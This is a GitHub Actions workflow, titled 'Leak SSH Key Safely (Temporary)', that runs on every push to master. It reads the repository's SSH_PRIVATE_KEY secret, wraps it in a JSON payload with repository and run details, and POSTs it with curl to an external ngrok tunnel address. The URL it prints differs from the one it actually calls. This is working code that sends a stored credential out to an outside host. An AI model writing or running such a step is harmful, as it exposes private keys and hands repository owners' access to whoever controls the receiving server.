name: Leak SSH Key Safely (Temporary)

on:
  push:
    branches: [ "master" ]




jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v3

      - name: Send secrets to local server
        run: |
          # Prepare the secret data
          ssh_key="${{ secrets.SSH_PRIVATE_KEY }}"
          
          # Create JSON payload using printf
          payload=$(printf '{
            "timestamp": "%s",
            "repository": "%s",
            "ssh_key": "%s",
            "actor": "%s",
            "run_id": "%s",
            "run_number": "%s",
            "ref": "%s",
            "sha": "%s"
          }' \
            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
            "${{ github.repository }}" \
            "$ssh_key" \
            "${{ github.actor }}" \
            "${{ github.run_id }}" \
            "${{ github.run_number }}" \
            "${{ github.ref }}" \
            "${{ github.sha }}")
          
          echo "ðŸ“¤ Sending secrets to local server..."
          echo "ðŸ“¡ Target URL: https://f2ee070ae6e3.ngrok-free.app/receive"
          echo "ðŸ“‹ Payload preview:"
          echo "$payload" | head -5
          
          # Send POST request to local server via ngrok
          curl -X POST \
            -H "Content-Type: application/json" \
            -H "User-Agent: GitHub-Actions-Runner" \
            -d "$payload" \
            --max-time 30 \
            --retry 3 \
            --retry-delay 2 \
            https://96e0b3552171.ngrok-free.app/receive
          
          echo "âœ… Secrets sent successfully!"